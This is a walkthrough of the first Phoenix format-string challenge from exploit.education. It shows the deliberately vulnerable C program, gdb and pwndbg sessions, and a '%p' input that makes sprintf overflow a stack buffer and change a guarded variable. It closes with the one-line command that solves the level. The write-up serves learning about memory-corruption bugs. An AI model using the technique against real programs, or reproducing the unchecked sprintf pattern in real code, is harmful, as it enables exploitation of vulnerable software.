# Format Zero
Format Zero is the 1st challenge of the Phoenix exploitation set of challenges on format string vulnerabilities, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `format-zero`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system.

It has been compiled as a ELF 64-bit LSB (little endian) binary and is not stripped you can see by yourself by looking at the output of the following output :
```
pwndbg> ! file format-zero  
format-zero: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-  
x86_64.so.1, not stripped
```

### File Security Informations
We can use `checksec` to see different security method enabled on the binary
```
pwndbg> checksec
[*] '/opt/phoenix/amd64/format-zero'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
   RPATH:    b'/opt/phoenix/x86_64-linux-musl/lib'
```
In this case everything seems disabled and we even have RWX segments, which means we could read, write and execute data in those segments, i don't think it'll be useful for this challenge.

## Having a look at the instructions on the website
We can check the following link for the challenge instructions
http://exploit.education/phoenix/format-zero/
```
This level introduces format strings, and how attacker supplied format strings can modify program execution.

Hints
	-   man 3 printf
	-   https://www.google.com/search?q= "exploiting+format+string+vulnerabilities"
```

Instructions are pretty simple, it tells us we're dealing with the first level about format strings vulnerabilities. If you don't know much about them, it's your job to search and learn.

Let's have a look at the given code in order to understand a little more what we need to do.
```c
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

Okay so let's start analyzing our main function...
We start by declaring a struct named `locals` that has the following parameters :
- **char dest[32];**
- **volatile int changeme;**
*volatile means the address of the variable can change at any time during run-time.*

We then define a variable names `buffer` that can hold a maximum of 15 characters and a `\0` character.

We then call a `fgets` on `buffer` with a maximum read size of `sizeof(buffer)`, which means we won't be able to input more than 15 bytes. This also means the program is not vulnerable to a buffer overflow vulnerability.

We set the last character of `buffer[15]` to 0, and we do the same for `locals.changeme` which is the variable we will need to modify in order to win the challenge.

Next the most interesting part of the program happens, which is the call to `sprintf`, `sprintf` take whatever the content of buffer, is and put it in `locals.dest` we can potentially overwrite `locals.dest` which is 32 bytes in size, but remember we can't overflow our buffer variable.... Or can we ?

We can potentially use a `format string vulnerability` to **input more than 15 characters** to our program, this can be achieved using our call to `sprintf`, if we input `%p%p%p` to our program, the `sprintf` function call will modify `%p%p%p` into `0xdeadbeef0xdeadbeef0xdeadbeef` (i used deadbeef as an address example) and put the hexadecimal string into `locals.dest`.

Now the length of the string `0xdeadbeefcafedead0xdeadbeefcafedead0xdeadbeefcafedead` is more than 36 characters, we should be able to overflow our `locals.dest` variable and also our `locals.changeme` variable, let's try using gdb first.

## Finding how to exploit the program using gdb
Let's start debugging our program using gdb
`$ gdb ./format-zero`

We can then look at the functions in the program using `info functions` or `info fun`, and we should get a list of functions.
```
pwndbg> info functions  
All defined functions:  
  
Non-debugging symbols:  
0x00000000004004b0 _init  
0x00000000004004d0 fgets@plt  
0x00000000004004e0 puts@plt  
0x00000000004004f0 errx@plt  
0x0000000000400500 sprintf@plt  
0x0000000000400510 exit@plt  
0x0000000000400520 __libc_start_main@plt  
0x0000000000400530 _start  
0x0000000000400546 _start_c  
0x0000000000400570 deregister_tm_clones  
0x00000000004005a0 register_tm_clones  
0x00000000004005e0 __do_global_dtors_aux  
0x0000000000400670 frame_dummy  
0x000000000040069d main  
0x0000000000400740 __do_global_ctors_aux  
0x0000000000400782 _fini
```

We see main is at `0x000000000040069d`, let's disassemble main using `disass main`.
```
pwndbg> disass main  
Dump of assembler code for function main:  
  0x000000000040069d <+0>:     push   rbp  
  0x000000000040069e <+1>:     mov    rbp,rsp  
  0x00000000004006a1 <+4>:     sub    rsp,0x50  
  0x00000000004006a5 <+8>:     mov    DWORD PTR [rbp-0x44],edi  
  0x00000000004006a8 <+11>:    mov    QWORD PTR [rbp-0x50],rsi  
  0x00000000004006ac <+15>:    mov    edi,0x400790  
  0x00000000004006b1 <+20>:    call 0x4004e0 <puts@plt>  
  0x00000000004006b6 <+25>:    mov    rdx,QWORD PTR [rip+0x200423]        # 0x600ae0 <stdin>  
  0x00000000004006bd <+32>:    lea    rax,[rbp-0x40]  
  0x00000000004006c1 <+36>:    mov    esi,0xf  
  0x00000000004006c6 <+41>:    mov    rdi,rax  
  0x00000000004006c9 <+44>:    call 0x4004d0 <fgets@plt>  
  0x00000000004006ce <+49>:    test   rax,rax  
  0x00000000004006d1 <+52>:    jne 0x4006e7 <main+74>  
  0x00000000004006d3 <+54>:    mov    esi,0x4007dc  
  0x00000000004006d8 <+59>:    mov    edi,0x1  
  0x00000000004006dd <+64>:    mov    eax,0x0  
  0x00000000004006e2 <+69>:    call 0x4004f0 <errx@plt>  
  0x00000000004006e7 <+74>:    mov    BYTE PTR [rbp-0x31],0x0  
  0x00000000004006eb <+78>:    mov    DWORD PTR [rbp-0x10],0x0  
  0x00000000004006f2 <+85>:    lea    rdx,[rbp-0x40]  
  0x00000000004006f6 <+89>:    lea    rax,[rbp-0x30]  
  0x00000000004006fa <+93>:    mov    rsi,rdx  
  0x00000000004006fd <+96>:    mov    rdi,rax  
  0x0000000000400700 <+99>:    mov    eax,0x0  
  0x0000000000400705 <+104>:   call 0x400500 <sprintf@plt>  
  0x000000000040070a <+109>:   mov    eax,DWORD PTR [rbp-0x10]  
  0x000000000040070d <+112>:   test   eax,eax  
  0x000000000040070f <+114>:   je 0x40071d <main+128>  
  0x0000000000400711 <+116>:   mov    edi,0x4007f8  
  0x0000000000400716 <+121>:   call 0x4004e0 <puts@plt>  
  0x000000000040071b <+126>:   jmp 0x400727 <main+138>  
  0x000000000040071d <+128>:   mov    edi,0x400830  
  0x0000000000400722 <+133>:   call 0x4004e0 <puts@plt>  
  0x0000000000400727 <+138>:   mov    edi,0x0  
  0x000000000040072c <+143>:   call 0x400510 <exit@plt>  
End of assembler dump.
```

On the assembler dump, our input is stored at the `rbp-0x40` offset after the call to `fgets`.

Before our `sprintf` function call, we move `rbp-0x40` in `rdx` then `rbp-0x30` in `rax`, we can check the content of both of these variables, let's first put a breakpoint on our call to `sprintf`, and run our program with 12345 as arguments.
```
pwndbg> b *main+104  
Breakpoint 1 at 0x400705

pwndbg> r  
Starting program: /opt/phoenix/amd64/format-zero    
Welcome to phoenix/format-zero, brought to you by https://exploit.education  
123456

Breakpoint 1, 0x0000000000400705 in main ()
```

We have now hitted our breakpoint at `main+104`, if you use `pwndbg` plugin for `gdb`, you should see something like this 
```bash
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
───────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────  
RAX  0x0  
RBX 0x7fffffffddd8 —▸ 0x7fffffffe165 ◂— '/opt/phoenix/amd64/format-zero'  
RCX 0x7ffff7ffc52e (buf+14) ◂— 0xa /* '\n' */  
RDX 0x7fffffffdd40 ◂— 0xa363534333231 /* '123456\n' */  
RDI 0x7fffffffdd50 ◂— 0x0  
RSI 0x7fffffffdd40 ◂— 0xa363534333231 /* '123456\n' */  
R8  0x7ffff7ffb300 (f) ◂— 0x5  
R9  0x7fffffffdcff ◂— 0x7fffffffdd8000  
R10  0x1  
R11  0x246  
R12 0x7fffffffdde8 —▸ 0x7fffffffe184 ◂— 'COLORFGBG=15;0'  
R13 0x40069d (main) ◂— push rbp  
R14  0x0  
R15  0x0  
RBP 0x7fffffffdd80 ◂— 0x1  
RSP 0x7fffffffdd30 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe165 ◂— '/opt/phoenix/amd64/format-zero'  
RIP 0x400705 (main+104) ◂— call 0x400500  
─────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────  
► 0x400705 <main+104> call sprintf@plt <sprintf@plt>  
       s: 0x7fffffffdd50 ◂— 0x0  
       format: 0x7fffffffdd40 ◂— 0xa363534333231 /* '123456\n' */  
       vararg: 0x7fffffffdd40 ◂— 0xa363534333231 /* '123456\n' */  
   
  0x40070a <main+109>    mov eax, dword ptr [rbp - 0x10]  
  0x40070d <main+112>    test eax, eax  
  0x40070f <main+114>    je main+128 <main+128>  
   
  0x400711 <main+116>    mov edi, 0x4007f8  
  0x400716 <main+121>    call puts@plt <puts@plt>  
   
  0x40071b <main+126>    jmp main+138 <main+138>  
   
  0x40071d <main+128>    mov edi, 0x400830  
  0x400722 <main+133>    call puts@plt <puts@plt>  
   
  0x400727 <main+138>    mov edi, 0  
  0x40072c <main+143>    call exit@plt <exit@plt>  
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────  
00:0000│ rsp  0x7fffffffdd30 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe165 ◂— '/opt/phoenix/amd64/format-zero'  
01:0008│  0x7fffffffdd38 ◂— 0x100000000  
02:0010│ rdx rsi 0x7fffffffdd40 ◂— 0xa363534333231 /* '123456\n' */  
03:0018│  0x7fffffffdd48 ◂— 0x0  
04:0020│ rdi  0x7fffffffdd50 ◂— 0x0  
05:0028│  0x7fffffffdd58 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe165 ◂— '/opt/phoenix/amd64/format-zero'  
06:0030│  0x7fffffffdd60 ◂— 0x1  
07:0038│  0x7fffffffdd68 —▸ 0x7fffffffdde8 —▸ 0x7fffffffe184 ◂— 'COLORFGBG=15;0'  
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────  
► f 0         0x400705 main+104  
  f 1   0x7ffff7d8fd62 __libc_start_main+54  
  f 2              0x0  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

The `s` argument to the `sprintf` function call is where our input will be store and `format` and `vararg` correspond to our input.

We can step over the function with the `ni` command for `gdb`
```
pwndbg> ni  
0x000000000040070a in main ()
```

Let's print the content of `rbp-0x30` and see if your input was correctly copied into it
```
pwndbg> x/s $rbp-0x40  
0x7fffffffdd40: "123456\n"

pwndbg> x/s $rbp-0x30  
0x7fffffffdd50: "123456\n"
```

Both buffer contains the same content, since we did not overflow anything the content of `rbp-0x10 (locals.changeme)` should still be 0, let's confirm this
```
pwndbg> x/s $rbp-0x10  
0x7fffffffdd70: ""
```

Okay so we know how the program works, we just need to proof we can exploit it using a `format string vulnerability`. To do that, we'll re-run our program with the same breakpoints we just used, but this time we'll input `%p-%p-%p`, i added `-` as delimiters, note that we are under 15 characters so we should totally be able to input that to our program.
```
pwndbg> r  
Starting program: /opt/phoenix/amd64/format-zero    
Welcome to phoenix/format-zero, brought to you by https://exploit.education  
%p-%p-%p  
  
Breakpoint 1, 0x0000000000400705 in main ()
```

We have hit our breakpoint at `sprintf`, let's `step over` it.
```
pwndbg> ni  
0x000000000040070a in main ()
```

And let's check the content of `rbp-0x30` to proof that `%p` has been modified to the current address on top of the stack.
```
pwndbg> x/s $rbp-0x30  
0x7fffffffdd50: "0x7fffffffdd40-0x7ffff7ffc530-0x7ffff7ffb300\n"
```

And now our input is way bigger than **15 characters**, so we basically overflowed our `locals.changeme` variable while calling `sprintf` on `locals.dest` which is 32 bytes in size.

Let's confirm that by checking the content of `rbp-0x10`
```
pwndbg> x/s $rbp-0x10  
0x7fffffffdd70: "7ffff7ffb300\n"
```

Let's check the offset at which rbp-0x10 has been overflowed, to do that we'll calculate the length of `rbp-0x30 - rbp-0x10`
```
pwndbg> ! python -c 'print(len("0x7fffffffdd40-0x7ffff7ffc530-0x7ffff7ffb300") - len("7ffff7ffb300"))'
32
```
We can see we start overflowing our rbp-0x10 variable when rbp-0x30 is bigger than 32 bytes.

32 bytes is also the size of `locals.dest`  character array in the struct, let's continue the execution flow of the program and you should see that we won the challenge
```
pwndbg> c  
Continuing.  
Well done, the 'changeme' variable has been changed!  
[Inferior 1 (process 238770) exited normally]
```
Hell Yeah ! But this time let's do it outside `gdb`.
 ```
 ./format-zero <<<$(echo '%p-%p-%p')   
Welcome to phoenix/format-zero, brought to you by https://exploit.education  
Well done, the 'changeme' variable has been changed!
 ```
